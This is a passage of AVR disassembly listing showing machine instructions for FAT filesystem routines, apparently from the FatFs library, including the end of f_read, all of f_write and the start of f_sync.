    3092:	20 8e       	std	Z+24, r2	; 0x18
    3094:	31 8e       	std	Z+25, r3	; 0x19
    3096:	42 8e       	std	Z+26, r4	; 0x1a
    3098:	53 8e       	std	Z+27, r5	; 0x1b
    309a:	f7 01       	movw	r30, r14
    309c:	80 89       	ldd	r24, Z+16	; 0x10
    309e:	91 89       	ldd	r25, Z+17	; 0x11
    30a0:	a2 89       	ldd	r26, Z+18	; 0x12
    30a2:	b3 89       	ldd	r27, Z+19	; 0x13
    30a4:	91 70       	andi	r25, 0x01	; 1
    30a6:	20 e0       	ldi	r18, 0x00	; 0
    30a8:	32 e0       	ldi	r19, 0x02	; 2
    30aa:	69 01       	movw	r12, r18
    30ac:	c8 1a       	sub	r12, r24
    30ae:	d9 0a       	sbc	r13, r25
    30b0:	ac 14       	cp	r10, r12
    30b2:	bd 04       	cpc	r11, r13
    30b4:	08 f4       	brcc	.+2      	; 0x30b8 <f_read+0x224>
    30b6:	65 01       	movw	r12, r10
    30b8:	f7 01       	movw	r30, r14
    30ba:	40 8d       	ldd	r20, Z+24	; 0x18
    30bc:	51 8d       	ldd	r21, Z+25	; 0x19
    30be:	62 8d       	ldd	r22, Z+26	; 0x1a
    30c0:	73 8d       	ldd	r23, Z+27	; 0x1b
    30c2:	89 81       	ldd	r24, Y+1	; 0x01
    30c4:	9a 81       	ldd	r25, Y+2	; 0x02
    30c6:	0e 94 68 08 	call	0x10d0	; 0x10d0 <move_window>
    30ca:	88 23       	and	r24, r24
    30cc:	21 f0       	breq	.+8      	; 0x30d6 <f_read+0x242>
    30ce:	81 e0       	ldi	r24, 0x01	; 1
    30d0:	f7 01       	movw	r30, r14
    30d2:	87 87       	std	Z+15, r24	; 0x0f
    30d4:	31 c0       	rjmp	.+98     	; 0x3138 <f_read+0x2a4>
    30d6:	89 81       	ldd	r24, Y+1	; 0x01
    30d8:	9a 81       	ldd	r25, Y+2	; 0x02
    30da:	9c 01       	movw	r18, r24
    30dc:	2d 5c       	subi	r18, 0xCD	; 205
    30de:	3f 4f       	sbci	r19, 0xFF	; 255
    30e0:	f7 01       	movw	r30, r14
    30e2:	80 89       	ldd	r24, Z+16	; 0x10
    30e4:	91 89       	ldd	r25, Z+17	; 0x11
    30e6:	a2 89       	ldd	r26, Z+18	; 0x12
    30e8:	b3 89       	ldd	r27, Z+19	; 0x13
    30ea:	91 70       	andi	r25, 0x01	; 1
    30ec:	b9 01       	movw	r22, r18
    30ee:	68 0f       	add	r22, r24
    30f0:	79 1f       	adc	r23, r25
    30f2:	a6 01       	movw	r20, r12
    30f4:	c3 01       	movw	r24, r6
    30f6:	0e 94 0c 39 	call	0x7218	; 0x7218 <memcpy>
    30fa:	ac 18       	sub	r10, r12
    30fc:	bd 08       	sbc	r11, r13
    30fe:	f4 01       	movw	r30, r8
    3100:	80 81       	ld	r24, Z
    3102:	91 81       	ldd	r25, Z+1	; 0x01
    3104:	8c 0d       	add	r24, r12
    3106:	9d 1d       	adc	r25, r13
    3108:	91 83       	std	Z+1, r25	; 0x01
    310a:	80 83       	st	Z, r24
    310c:	6c 0c       	add	r6, r12
    310e:	7d 1c       	adc	r7, r13
    3110:	f7 01       	movw	r30, r14
    3112:	80 89       	ldd	r24, Z+16	; 0x10
    3114:	91 89       	ldd	r25, Z+17	; 0x11
    3116:	a2 89       	ldd	r26, Z+18	; 0x12
    3118:	b3 89       	ldd	r27, Z+19	; 0x13
    311a:	8c 0d       	add	r24, r12
    311c:	9d 1d       	adc	r25, r13
    311e:	a1 1d       	adc	r26, r1
    3120:	b1 1d       	adc	r27, r1
    3122:	80 8b       	std	Z+16, r24	; 0x10
    3124:	91 8b       	std	Z+17, r25	; 0x11
    3126:	a2 8b       	std	Z+18, r26	; 0x12
    3128:	b3 8b       	std	Z+19, r27	; 0x13
    312a:	a1 14       	cp	r10, r1
    312c:	b1 04       	cpc	r11, r1
    312e:	09 f0       	breq	.+2      	; 0x3132 <f_read+0x29e>
    3130:	f9 ce       	rjmp	.-526    	; 0x2f24 <f_read+0x90>
    3132:	80 e0       	ldi	r24, 0x00	; 0
    3134:	01 c0       	rjmp	.+2      	; 0x3138 <f_read+0x2a4>
    3136:	87 e0       	ldi	r24, 0x07	; 7
    3138:	28 96       	adiw	r28, 0x08	; 8
    313a:	0f b6       	in	r0, 0x3f	; 63
    313c:	f8 94       	cli
    313e:	de bf       	out	0x3e, r29	; 62
    3140:	0f be       	out	0x3f, r0	; 63
    3142:	cd bf       	out	0x3d, r28	; 61
    3144:	df 91       	pop	r29
    3146:	cf 91       	pop	r28
    3148:	1f 91       	pop	r17
    314a:	0f 91       	pop	r16
    314c:	ff 90       	pop	r15
    314e:	ef 90       	pop	r14
    3150:	df 90       	pop	r13
    3152:	cf 90       	pop	r12
    3154:	bf 90       	pop	r11
    3156:	af 90       	pop	r10
    3158:	9f 90       	pop	r9
    315a:	8f 90       	pop	r8
    315c:	7f 90       	pop	r7
    315e:	6f 90       	pop	r6
    3160:	5f 90       	pop	r5
    3162:	4f 90       	pop	r4
    3164:	3f 90       	pop	r3
    3166:	2f 90       	pop	r2
    3168:	08 95       	ret

0000316a <f_write>:
    316a:	2f 92       	push	r2
    316c:	3f 92       	push	r3
    316e:	4f 92       	push	r4
    3170:	5f 92       	push	r5
    3172:	6f 92       	push	r6
    3174:	7f 92       	push	r7
    3176:	8f 92       	push	r8
    3178:	9f 92       	push	r9
    317a:	af 92       	push	r10
    317c:	bf 92       	push	r11
    317e:	cf 92       	push	r12
    3180:	df 92       	push	r13
    3182:	ef 92       	push	r14
    3184:	ff 92       	push	r15
    3186:	0f 93       	push	r16
    3188:	1f 93       	push	r17
    318a:	cf 93       	push	r28
    318c:	df 93       	push	r29
    318e:	cd b7       	in	r28, 0x3d	; 61
    3190:	de b7       	in	r29, 0x3e	; 62
    3192:	28 97       	sbiw	r28, 0x08	; 8
    3194:	0f b6       	in	r0, 0x3f	; 63
    3196:	f8 94       	cli
    3198:	de bf       	out	0x3e, r29	; 62
    319a:	0f be       	out	0x3f, r0	; 63
    319c:	cd bf       	out	0x3d, r28	; 61
    319e:	7c 01       	movw	r14, r24
    31a0:	3b 01       	movw	r6, r22
    31a2:	5a 01       	movw	r10, r20
    31a4:	49 01       	movw	r8, r18
    31a6:	f9 01       	movw	r30, r18
    31a8:	11 82       	std	Z+1, r1	; 0x01
    31aa:	10 82       	st	Z, r1
    31ac:	8d 83       	std	Y+5, r24	; 0x05
    31ae:	fe 82       	std	Y+6, r15	; 0x06
    31b0:	be 01       	movw	r22, r28
    31b2:	6f 5f       	subi	r22, 0xFF	; 255
    31b4:	7f 4f       	sbci	r23, 0xFF	; 255
    31b6:	0e 94 dc 07 	call	0xfb8	; 0xfb8 <validate>
    31ba:	81 11       	cpse	r24, r1
    31bc:	94 c1       	rjmp	.+808    	; 0x34e6 <f_write+0x37c>
    31be:	f7 01       	movw	r30, r14
    31c0:	87 85       	ldd	r24, Z+15	; 0x0f
    31c2:	81 11       	cpse	r24, r1
    31c4:	90 c1       	rjmp	.+800    	; 0x34e6 <f_write+0x37c>
    31c6:	86 85       	ldd	r24, Z+14	; 0x0e
    31c8:	81 ff       	sbrs	r24, 1
    31ca:	8c c1       	rjmp	.+792    	; 0x34e4 <f_write+0x37a>
    31cc:	80 89       	ldd	r24, Z+16	; 0x10
    31ce:	91 89       	ldd	r25, Z+17	; 0x11
    31d0:	a2 89       	ldd	r26, Z+18	; 0x12
    31d2:	b3 89       	ldd	r27, Z+19	; 0x13
    31d4:	ac 01       	movw	r20, r24
    31d6:	bd 01       	movw	r22, r26
    31d8:	4a 0d       	add	r20, r10
    31da:	5b 1d       	adc	r21, r11
    31dc:	61 1d       	adc	r22, r1
    31de:	71 1d       	adc	r23, r1
    31e0:	48 17       	cp	r20, r24
    31e2:	59 07       	cpc	r21, r25
    31e4:	6a 07       	cpc	r22, r26
    31e6:	7b 07       	cpc	r23, r27
    31e8:	08 f0       	brcs	.+2      	; 0x31ec <f_write+0x82>
    31ea:	72 c1       	rjmp	.+740    	; 0x34d0 <f_write+0x366>
    31ec:	5c 01       	movw	r10, r24
    31ee:	a0 94       	com	r10
    31f0:	b0 94       	com	r11
    31f2:	6e c1       	rjmp	.+732    	; 0x34d0 <f_write+0x366>
    31f4:	f7 01       	movw	r30, r14
    31f6:	80 89       	ldd	r24, Z+16	; 0x10
    31f8:	91 89       	ldd	r25, Z+17	; 0x11
    31fa:	a2 89       	ldd	r26, Z+18	; 0x12
    31fc:	b3 89       	ldd	r27, Z+19	; 0x13
    31fe:	ac 01       	movw	r20, r24
    3200:	bd 01       	movw	r22, r26
    3202:	51 70       	andi	r21, 0x01	; 1
    3204:	66 27       	eor	r22, r22
    3206:	77 27       	eor	r23, r23
    3208:	45 2b       	or	r20, r21
    320a:	46 2b       	or	r20, r22
    320c:	47 2b       	or	r20, r23
    320e:	09 f0       	breq	.+2      	; 0x3212 <f_write+0xa8>
    3210:	04 c1       	rjmp	.+520    	; 0x341a <f_write+0x2b0>
    3212:	e9 81       	ldd	r30, Y+1	; 0x01
    3214:	fa 81       	ldd	r31, Y+2	; 0x02
    3216:	01 85       	ldd	r16, Z+9	; 0x09
    3218:	12 85       	ldd	r17, Z+10	; 0x0a
    321a:	01 50       	subi	r16, 0x01	; 1
    321c:	11 09       	sbc	r17, r1
    321e:	ac 01       	movw	r20, r24
    3220:	bd 01       	movw	r22, r26
    3222:	03 2e       	mov	r0, r19
    3224:	39 e0       	ldi	r19, 0x09	; 9
    3226:	76 95       	lsr	r23
    3228:	67 95       	ror	r22
    322a:	57 95       	ror	r21
    322c:	47 95       	ror	r20
    322e:	3a 95       	dec	r19
    3230:	d1 f7       	brne	.-12     	; 0x3226 <f_write+0xbc>
    3232:	30 2d       	mov	r19, r0
    3234:	04 23       	and	r16, r20
    3236:	15 23       	and	r17, r21
    3238:	01 15       	cp	r16, r1
    323a:	11 05       	cpc	r17, r1
    323c:	09 f0       	breq	.+2      	; 0x3240 <f_write+0xd6>
    323e:	49 c0       	rjmp	.+146    	; 0x32d2 <f_write+0x168>
    3240:	89 2b       	or	r24, r25
    3242:	8a 2b       	or	r24, r26
    3244:	8b 2b       	or	r24, r27
    3246:	91 f4       	brne	.+36     	; 0x326c <f_write+0x102>
    3248:	f7 01       	movw	r30, r14
    324a:	66 81       	ldd	r22, Z+6	; 0x06
    324c:	77 81       	ldd	r23, Z+7	; 0x07
    324e:	80 85       	ldd	r24, Z+8	; 0x08
    3250:	91 85       	ldd	r25, Z+9	; 0x09
    3252:	61 15       	cp	r22, r1
    3254:	71 05       	cpc	r23, r1
    3256:	81 05       	cpc	r24, r1
    3258:	91 05       	cpc	r25, r1
    325a:	89 f4       	brne	.+34     	; 0x327e <f_write+0x114>
    325c:	40 e0       	ldi	r20, 0x00	; 0
    325e:	50 e0       	ldi	r21, 0x00	; 0
    3260:	ba 01       	movw	r22, r20
    3262:	8d 81       	ldd	r24, Y+5	; 0x05
    3264:	9e 81       	ldd	r25, Y+6	; 0x06
    3266:	0e 94 1d 0f 	call	0x1e3a	; 0x1e3a <create_chain>
    326a:	09 c0       	rjmp	.+18     	; 0x327e <f_write+0x114>
    326c:	f7 01       	movw	r30, r14
    326e:	44 89       	ldd	r20, Z+20	; 0x14
    3270:	55 89       	ldd	r21, Z+21	; 0x15
    3272:	66 89       	ldd	r22, Z+22	; 0x16
    3274:	77 89       	ldd	r23, Z+23	; 0x17
    3276:	8d 81       	ldd	r24, Y+5	; 0x05
    3278:	9e 81       	ldd	r25, Y+6	; 0x06
    327a:	0e 94 1d 0f 	call	0x1e3a	; 0x1e3a <create_chain>
    327e:	61 15       	cp	r22, r1
    3280:	71 05       	cpc	r23, r1
    3282:	81 05       	cpc	r24, r1
    3284:	91 05       	cpc	r25, r1
    3286:	09 f4       	brne	.+2      	; 0x328a <f_write+0x120>
    3288:	27 c1       	rjmp	.+590    	; 0x34d8 <f_write+0x36e>
    328a:	61 30       	cpi	r22, 0x01	; 1
    328c:	71 05       	cpc	r23, r1
    328e:	81 05       	cpc	r24, r1
    3290:	91 05       	cpc	r25, r1
    3292:	21 f4       	brne	.+8      	; 0x329c <f_write+0x132>
    3294:	82 e0       	ldi	r24, 0x02	; 2
    3296:	f7 01       	movw	r30, r14
    3298:	87 87       	std	Z+15, r24	; 0x0f
    329a:	25 c1       	rjmp	.+586    	; 0x34e6 <f_write+0x37c>
    329c:	6f 3f       	cpi	r22, 0xFF	; 255
    329e:	ff ef       	ldi	r31, 0xFF	; 255
    32a0:	7f 07       	cpc	r23, r31
    32a2:	8f 07       	cpc	r24, r31
    32a4:	9f 07       	cpc	r25, r31
    32a6:	21 f4       	brne	.+8      	; 0x32b0 <f_write+0x146>
    32a8:	81 e0       	ldi	r24, 0x01	; 1
    32aa:	f7 01       	movw	r30, r14
    32ac:	87 87       	std	Z+15, r24	; 0x0f
    32ae:	1b c1       	rjmp	.+566    	; 0x34e6 <f_write+0x37c>
    32b0:	f7 01       	movw	r30, r14
    32b2:	64 8b       	std	Z+20, r22	; 0x14
    32b4:	75 8b       	std	Z+21, r23	; 0x15
    32b6:	86 8b       	std	Z+22, r24	; 0x16
    32b8:	97 8b       	std	Z+23, r25	; 0x17
    32ba:	26 81       	ldd	r18, Z+6	; 0x06
    32bc:	37 81       	ldd	r19, Z+7	; 0x07
    32be:	40 85       	ldd	r20, Z+8	; 0x08
    32c0:	51 85       	ldd	r21, Z+9	; 0x09
    32c2:	23 2b       	or	r18, r19
    32c4:	24 2b       	or	r18, r20
    32c6:	25 2b       	or	r18, r21
    32c8:	21 f4       	brne	.+8      	; 0x32d2 <f_write+0x168>
    32ca:	66 83       	std	Z+6, r22	; 0x06
    32cc:	77 83       	std	Z+7, r23	; 0x07
    32ce:	80 87       	std	Z+8, r24	; 0x08
    32d0:	91 87       	std	Z+9, r25	; 0x09
    32d2:	29 81       	ldd	r18, Y+1	; 0x01
    32d4:	3a 81       	ldd	r19, Y+2	; 0x02
    32d6:	f9 01       	movw	r30, r18
    32d8:	47 a5       	ldd	r20, Z+47	; 0x2f
    32da:	50 a9       	ldd	r21, Z+48	; 0x30
    32dc:	61 a9       	ldd	r22, Z+49	; 0x31
    32de:	72 a9       	ldd	r23, Z+50	; 0x32
    32e0:	f7 01       	movw	r30, r14
    32e2:	80 8d       	ldd	r24, Z+24	; 0x18
    32e4:	91 8d       	ldd	r25, Z+25	; 0x19
    32e6:	a2 8d       	ldd	r26, Z+26	; 0x1a
    32e8:	b3 8d       	ldd	r27, Z+27	; 0x1b
    32ea:	48 17       	cp	r20, r24
    32ec:	59 07       	cpc	r21, r25
    32ee:	6a 07       	cpc	r22, r26
    32f0:	7b 07       	cpc	r23, r27
    32f2:	49 f4       	brne	.+18     	; 0x3306 <f_write+0x19c>
    32f4:	c9 01       	movw	r24, r18
    32f6:	0e 94 10 08 	call	0x1020	; 0x1020 <sync_window>
    32fa:	88 23       	and	r24, r24
    32fc:	21 f0       	breq	.+8      	; 0x3306 <f_write+0x19c>
    32fe:	81 e0       	ldi	r24, 0x01	; 1
    3300:	f7 01       	movw	r30, r14
    3302:	87 87       	std	Z+15, r24	; 0x0f
    3304:	f0 c0       	rjmp	.+480    	; 0x34e6 <f_write+0x37c>
    3306:	f7 01       	movw	r30, r14
    3308:	44 89       	ldd	r20, Z+20	; 0x14
    330a:	55 89       	ldd	r21, Z+21	; 0x15
    330c:	66 89       	ldd	r22, Z+22	; 0x16
    330e:	77 89       	ldd	r23, Z+23	; 0x17
    3310:	89 81       	ldd	r24, Y+1	; 0x01
    3312:	9a 81       	ldd	r25, Y+2	; 0x02
    3314:	9c 83       	std	Y+4, r25	; 0x04
    3316:	8b 83       	std	Y+3, r24	; 0x03
    3318:	0e 94 28 07 	call	0xe50	; 0xe50 <clst2sect>
    331c:	61 15       	cp	r22, r1
    331e:	71 05       	cpc	r23, r1
    3320:	81 05       	cpc	r24, r1
    3322:	91 05       	cpc	r25, r1
    3324:	21 f4       	brne	.+8      	; 0x332e <f_write+0x1c4>
    3326:	82 e0       	ldi	r24, 0x02	; 2
    3328:	f7 01       	movw	r30, r14
    332a:	87 87       	std	Z+15, r24	; 0x0f
    332c:	dc c0       	rjmp	.+440    	; 0x34e6 <f_write+0x37c>
    332e:	1b 01       	movw	r2, r22
    3330:	2c 01       	movw	r4, r24
    3332:	20 0e       	add	r2, r16
    3334:	31 1e       	adc	r3, r17
    3336:	41 1c       	adc	r4, r1
    3338:	51 1c       	adc	r5, r1
    333a:	65 01       	movw	r12, r10
    333c:	cd 2c       	mov	r12, r13
    333e:	dd 24       	eor	r13, r13
    3340:	c6 94       	lsr	r12
    3342:	c1 14       	cp	r12, r1
    3344:	d1 04       	cpc	r13, r1
    3346:	09 f4       	brne	.+2      	; 0x334a <f_write+0x1e0>
    3348:	45 c0       	rjmp	.+138    	; 0x33d4 <f_write+0x26a>
    334a:	eb 81       	ldd	r30, Y+3	; 0x03
    334c:	fc 81       	ldd	r31, Y+4	; 0x04
    334e:	21 85       	ldd	r18, Z+9	; 0x09
    3350:	32 85       	ldd	r19, Z+10	; 0x0a
    3352:	c8 01       	movw	r24, r16
    3354:	8c 0d       	add	r24, r12
    3356:	9d 1d       	adc	r25, r13
    3358:	28 17       	cp	r18, r24
    335a:	39 07       	cpc	r19, r25
    335c:	18 f4       	brcc	.+6      	; 0x3364 <f_write+0x1fa>
    335e:	69 01       	movw	r12, r18
    3360:	c0 1a       	sub	r12, r16
    3362:	d1 0a       	sbc	r13, r17
    3364:	86 01       	movw	r16, r12
    3366:	a2 01       	movw	r20, r4
    3368:	91 01       	movw	r18, r2
    336a:	b3 01       	movw	r22, r6
    336c:	eb 81       	ldd	r30, Y+3	; 0x03
    336e:	fc 81       	ldd	r31, Y+4	; 0x04
    3370:	81 81       	ldd	r24, Z+1	; 0x01
    3372:	0e 94 ad 06 	call	0xd5a	; 0xd5a <disk_write>
    3376:	88 23       	and	r24, r24
    3378:	21 f0       	breq	.+8      	; 0x3382 <f_write+0x218>
    337a:	81 e0       	ldi	r24, 0x01	; 1
    337c:	f7 01       	movw	r30, r14
    337e:	87 87       	std	Z+15, r24	; 0x0f
    3380:	b2 c0       	rjmp	.+356    	; 0x34e6 <f_write+0x37c>
    3382:	29 81       	ldd	r18, Y+1	; 0x01
    3384:	3a 81       	ldd	r19, Y+2	; 0x02
    3386:	f9 01       	movw	r30, r18
    3388:	87 a5       	ldd	r24, Z+47	; 0x2f
    338a:	90 a9       	ldd	r25, Z+48	; 0x30
    338c:	a1 a9       	ldd	r26, Z+49	; 0x31
    338e:	b2 a9       	ldd	r27, Z+50	; 0x32
    3390:	82 19       	sub	r24, r2
    3392:	93 09       	sbc	r25, r3
    3394:	a4 09       	sbc	r26, r4
    3396:	b5 09       	sbc	r27, r5
    3398:	a6 01       	movw	r20, r12
    339a:	60 e0       	ldi	r22, 0x00	; 0
    339c:	70 e0       	ldi	r23, 0x00	; 0
    339e:	84 17       	cp	r24, r20
    33a0:	95 07       	cpc	r25, r21
    33a2:	a6 07       	cpc	r26, r22
    33a4:	b7 07       	cpc	r27, r23
    33a6:	90 f4       	brcc	.+36     	; 0x33cc <f_write+0x262>
    33a8:	f8 2f       	mov	r31, r24
    33aa:	ff 0f       	add	r31, r31
    33ac:	f8 87       	std	Y+8, r31	; 0x08
    33ae:	1f 82       	std	Y+7, r1	; 0x07
    33b0:	d9 01       	movw	r26, r18
    33b2:	d3 96       	adiw	r26, 0x33	; 51
    33b4:	ef 81       	ldd	r30, Y+7	; 0x07
    33b6:	f8 85       	ldd	r31, Y+8	; 0x08
    33b8:	e6 0d       	add	r30, r6
    33ba:	f7 1d       	adc	r31, r7
    33bc:	80 e0       	ldi	r24, 0x00	; 0
    33be:	92 e0       	ldi	r25, 0x02	; 2
    33c0:	01 90       	ld	r0, Z+
    33c2:	0d 92       	st	X+, r0
    33c4:	01 97       	sbiw	r24, 0x01	; 1
    33c6:	e1 f7       	brne	.-8      	; 0x33c0 <f_write+0x256>
    33c8:	f9 01       	movw	r30, r18
    33ca:	13 82       	std	Z+3, r1	; 0x03
    33cc:	dc 2c       	mov	r13, r12
    33ce:	cc 24       	eor	r12, r12
    33d0:	dd 0c       	add	r13, r13
    33d2:	56 c0       	rjmp	.+172    	; 0x3480 <f_write+0x316>
    33d4:	f7 01       	movw	r30, r14
    33d6:	40 89       	ldd	r20, Z+16	; 0x10
    33d8:	51 89       	ldd	r21, Z+17	; 0x11
    33da:	62 89       	ldd	r22, Z+18	; 0x12
    33dc:	73 89       	ldd	r23, Z+19	; 0x13
    33de:	82 85       	ldd	r24, Z+10	; 0x0a
    33e0:	93 85       	ldd	r25, Z+11	; 0x0b
    33e2:	a4 85       	ldd	r26, Z+12	; 0x0c
    33e4:	b5 85       	ldd	r27, Z+13	; 0x0d
    33e6:	48 17       	cp	r20, r24
    33e8:	59 07       	cpc	r21, r25
    33ea:	6a 07       	cpc	r22, r26
    33ec:	7b 07       	cpc	r23, r27
    33ee:	80 f0       	brcs	.+32     	; 0x3410 <f_write+0x2a6>
    33f0:	8b 81       	ldd	r24, Y+3	; 0x03
    33f2:	9c 81       	ldd	r25, Y+4	; 0x04
    33f4:	0e 94 10 08 	call	0x1020	; 0x1020 <sync_window>
    33f8:	88 23       	and	r24, r24
    33fa:	21 f0       	breq	.+8      	; 0x3404 <f_write+0x29a>
    33fc:	81 e0       	ldi	r24, 0x01	; 1
    33fe:	f7 01       	movw	r30, r14
    3400:	87 87       	std	Z+15, r24	; 0x0f
    3402:	71 c0       	rjmp	.+226    	; 0x34e6 <f_write+0x37c>
    3404:	e9 81       	ldd	r30, Y+1	; 0x01
    3406:	fa 81       	ldd	r31, Y+2	; 0x02
    3408:	27 a6       	std	Z+47, r2	; 0x2f
    340a:	30 aa       	std	Z+48, r3	; 0x30
    340c:	41 aa       	std	Z+49, r4	; 0x31
    340e:	52 aa       	std	Z+50, r5	; 0x32
    3410:	f7 01       	movw	r30, r14
    3412:	20 8e       	std	Z+24, r2	; 0x18
    3414:	31 8e       	std	Z+25, r3	; 0x19
    3416:	42 8e       	std	Z+26, r4	; 0x1a
    3418:	53 8e       	std	Z+27, r5	; 0x1b
    341a:	f7 01       	movw	r30, r14
    341c:	80 89       	ldd	r24, Z+16	; 0x10
    341e:	91 89       	ldd	r25, Z+17	; 0x11
    3420:	a2 89       	ldd	r26, Z+18	; 0x12
    3422:	b3 89       	ldd	r27, Z+19	; 0x13
    3424:	91 70       	andi	r25, 0x01	; 1
    3426:	20 e0       	ldi	r18, 0x00	; 0
    3428:	32 e0       	ldi	r19, 0x02	; 2
    342a:	69 01       	movw	r12, r18
    342c:	c8 1a       	sub	r12, r24
    342e:	d9 0a       	sbc	r13, r25
    3430:	ac 14       	cp	r10, r12
    3432:	bd 04       	cpc	r11, r13
    3434:	08 f4       	brcc	.+2      	; 0x3438 <f_write+0x2ce>
    3436:	65 01       	movw	r12, r10
    3438:	f7 01       	movw	r30, r14
    343a:	40 8d       	ldd	r20, Z+24	; 0x18
    343c:	51 8d       	ldd	r21, Z+25	; 0x19
    343e:	62 8d       	ldd	r22, Z+26	; 0x1a
    3440:	73 8d       	ldd	r23, Z+27	; 0x1b
    3442:	89 81       	ldd	r24, Y+1	; 0x01
    3444:	9a 81       	ldd	r25, Y+2	; 0x02
    3446:	0e 94 68 08 	call	0x10d0	; 0x10d0 <move_window>
    344a:	88 23       	and	r24, r24
    344c:	21 f0       	breq	.+8      	; 0x3456 <f_write+0x2ec>
    344e:	81 e0       	ldi	r24, 0x01	; 1
    3450:	f7 01       	movw	r30, r14
    3452:	87 87       	std	Z+15, r24	; 0x0f
    3454:	48 c0       	rjmp	.+144    	; 0x34e6 <f_write+0x37c>
    3456:	29 81       	ldd	r18, Y+1	; 0x01
    3458:	3a 81       	ldd	r19, Y+2	; 0x02
    345a:	2d 5c       	subi	r18, 0xCD	; 205
    345c:	3f 4f       	sbci	r19, 0xFF	; 255
    345e:	f7 01       	movw	r30, r14
    3460:	40 89       	ldd	r20, Z+16	; 0x10
    3462:	51 89       	ldd	r21, Z+17	; 0x11
    3464:	62 89       	ldd	r22, Z+18	; 0x12
    3466:	73 89       	ldd	r23, Z+19	; 0x13
    3468:	ca 01       	movw	r24, r20
    346a:	91 70       	andi	r25, 0x01	; 1
    346c:	a6 01       	movw	r20, r12
    346e:	b3 01       	movw	r22, r6
    3470:	82 0f       	add	r24, r18
    3472:	93 1f       	adc	r25, r19
    3474:	0e 94 0c 39 	call	0x7218	; 0x7218 <memcpy>
    3478:	e9 81       	ldd	r30, Y+1	; 0x01
    347a:	fa 81       	ldd	r31, Y+2	; 0x02
    347c:	81 e0       	ldi	r24, 0x01	; 1
    347e:	83 83       	std	Z+3, r24	; 0x03
    3480:	ac 18       	sub	r10, r12
    3482:	bd 08       	sbc	r11, r13
    3484:	f4 01       	movw	r30, r8
    3486:	80 81       	ld	r24, Z
    3488:	91 81       	ldd	r25, Z+1	; 0x01
    348a:	8c 0d       	add	r24, r12
    348c:	9d 1d       	adc	r25, r13
    348e:	91 83       	std	Z+1, r25	; 0x01
    3490:	80 83       	st	Z, r24
    3492:	6c 0c       	add	r6, r12
    3494:	7d 1c       	adc	r7, r13
    3496:	f7 01       	movw	r30, r14
    3498:	80 89       	ldd	r24, Z+16	; 0x10
    349a:	91 89       	ldd	r25, Z+17	; 0x11
    349c:	a2 89       	ldd	r26, Z+18	; 0x12
    349e:	b3 89       	ldd	r27, Z+19	; 0x13
    34a0:	8c 0d       	add	r24, r12
    34a2:	9d 1d       	adc	r25, r13
    34a4:	a1 1d       	adc	r26, r1
    34a6:	b1 1d       	adc	r27, r1
    34a8:	80 8b       	std	Z+16, r24	; 0x10
    34aa:	91 8b       	std	Z+17, r25	; 0x11
    34ac:	a2 8b       	std	Z+18, r26	; 0x12
    34ae:	b3 8b       	std	Z+19, r27	; 0x13
    34b0:	42 85       	ldd	r20, Z+10	; 0x0a
    34b2:	53 85       	ldd	r21, Z+11	; 0x0b
    34b4:	64 85       	ldd	r22, Z+12	; 0x0c
    34b6:	75 85       	ldd	r23, Z+13	; 0x0d
    34b8:	84 17       	cp	r24, r20
    34ba:	95 07       	cpc	r25, r21
    34bc:	a6 07       	cpc	r26, r22
    34be:	b7 07       	cpc	r27, r23
    34c0:	10 f4       	brcc	.+4      	; 0x34c6 <f_write+0x35c>
    34c2:	db 01       	movw	r26, r22
    34c4:	ca 01       	movw	r24, r20
    34c6:	f7 01       	movw	r30, r14
    34c8:	82 87       	std	Z+10, r24	; 0x0a
    34ca:	93 87       	std	Z+11, r25	; 0x0b
    34cc:	a4 87       	std	Z+12, r26	; 0x0c
    34ce:	b5 87       	std	Z+13, r27	; 0x0d
    34d0:	a1 14       	cp	r10, r1
    34d2:	b1 04       	cpc	r11, r1
    34d4:	09 f0       	breq	.+2      	; 0x34d8 <f_write+0x36e>
    34d6:	8e ce       	rjmp	.-740    	; 0x31f4 <f_write+0x8a>
    34d8:	f7 01       	movw	r30, r14
    34da:	86 85       	ldd	r24, Z+14	; 0x0e
    34dc:	80 64       	ori	r24, 0x40	; 64
    34de:	86 87       	std	Z+14, r24	; 0x0e
    34e0:	80 e0       	ldi	r24, 0x00	; 0
    34e2:	01 c0       	rjmp	.+2      	; 0x34e6 <f_write+0x37c>
    34e4:	87 e0       	ldi	r24, 0x07	; 7
    34e6:	28 96       	adiw	r28, 0x08	; 8
    34e8:	0f b6       	in	r0, 0x3f	; 63
    34ea:	f8 94       	cli
    34ec:	de bf       	out	0x3e, r29	; 62
    34ee:	0f be       	out	0x3f, r0	; 63
    34f0:	cd bf       	out	0x3d, r28	; 61
    34f2:	df 91       	pop	r29
    34f4:	cf 91       	pop	r28
    34f6:	1f 91       	pop	r17
    34f8:	0f 91       	pop	r16
    34fa:	ff 90       	pop	r15
    34fc:	ef 90       	pop	r14
    34fe:	df 90       	pop	r13
    3500:	cf 90       	pop	r12
    3502:	bf 90       	pop	r11
    3504:	af 90       	pop	r10
    3506:	9f 90       	pop	r9
    3508:	8f 90       	pop	r8
    350a:	7f 90       	pop	r7
    350c:	6f 90       	pop	r6
    350e:	5f 90       	pop	r5
    3510:	4f 90       	pop	r4
    3512:	3f 90       	pop	r3
    3514:	2f 90       	pop	r2
    3516:	08 95       	ret

00003518 <f_sync>:
    3518:	8f 92       	push	r8
    351a:	9f 92       	push	r9
    351c:	af 92       	push	r10
    351e:	bf 92       	push	r11
    3520:	ef 92       	push	r14
    3522:	ff 92       	push	r15
    3524:	0f 93       	push	r16
    3526:	1f 93       	push	r17
    3528:	cf 93       	push	r28
    352a:	df 93       	push	r29
    352c:	00 d0       	rcall	.+0      	; 0x352e <f_sync+0x16>
    352e:	cd b7       	in	r28, 0x3d	; 61
    3530:	de b7       	in	r29, 0x3e	; 62
    3532:	8c 01       	movw	r16, r24
    3534:	be 01       	movw	r22, r28
    3536:	6f 5f       	subi	r22, 0xFF	; 255
    3538:	7f 4f       	sbci	r23, 0xFF	; 255
    353a:	0e 94 dc 07 	call	0xfb8	; 0xfb8 <validate>
    353e:	81 11       	cpse	r24, r1
    3540:	43 c0       	rjmp	.+134    	; 0x35c8 <f_sync+0xb0>
    3542:	f8 01       	movw	r30, r16
    3544:	96 85       	ldd	r25, Z+14	; 0x0e
    3546:	96 ff       	sbrs	r25, 6
    3548:	3f c0       	rjmp	.+126    	; 0x35c8 <f_sync+0xb0>
    354a:	0e 94 e4 27 	call	0x4fc8	; 0x4fc8 <get_fattime>
    354e:	4b 01       	movw	r8, r22
    3550:	5c 01       	movw	r10, r24
    3552:	f8 01       	movw	r30, r16
    3554:	44 8d       	ldd	r20, Z+28	; 0x1c
    3556:	55 8d       	ldd	r21, Z+29	; 0x1d
